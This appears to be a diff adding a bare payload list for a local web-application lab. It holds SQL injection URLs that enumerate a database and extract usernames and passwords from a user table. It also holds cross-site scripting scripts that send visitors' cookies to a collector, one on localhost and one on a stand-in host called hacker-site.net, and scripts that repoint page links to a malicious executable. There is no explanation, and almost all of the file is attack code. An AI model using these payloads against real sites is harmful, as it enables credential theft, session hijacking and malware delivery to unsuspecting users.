@@ -1,0 +1,32 @@
+http://localhost/WebApp/bestbuy.php?id=1 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema = database()
+http://localhost/WebApp/bestbuy.php?id=-1 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=0x74626c5f75736572
+http://localhost/WebApp/bestbuy.php?id=-1 union select 1,group_concat(uname,0x3a,pass),3,4,5,6 from tbl_user
+
+
+
+XSS
+
+<script type="text/javascript">
+	window.location ="http://localhost:8000/GetCookie/getcookie.php?cookie=" + document.cookie;
+</script>
+
+<script type="text/javascript">
+	var+i=new+Image;+i.src="http://hacker-site.net/getcookie.php?cookie="+document.cookie;
+</script>
+
+<script>
+	window.onload = function() {var AllLinks=document.getElementsByTagName("a"); AllLinks[0].href = "http://badexample.com/malicious.exe"; }
+</script>
+
+
+
+<script type="text/javascript">
+	var+i=new+Image;+i.src="http://localhost/GetCookie/getcookie.php?cookie="+document.cookie;
+</script>
+
+<script>
+	window.onload = function() {var AllLinks=document.getElementsByTagName("a"); AllLinks[0].href = "http://badexample.com/malicious.exe"; }
+</script>
+<script type="text/javascript">
+	window.location ="http://localhost/GetCookie/getcookie.php?cookie=" + document.cookie;
+</script>
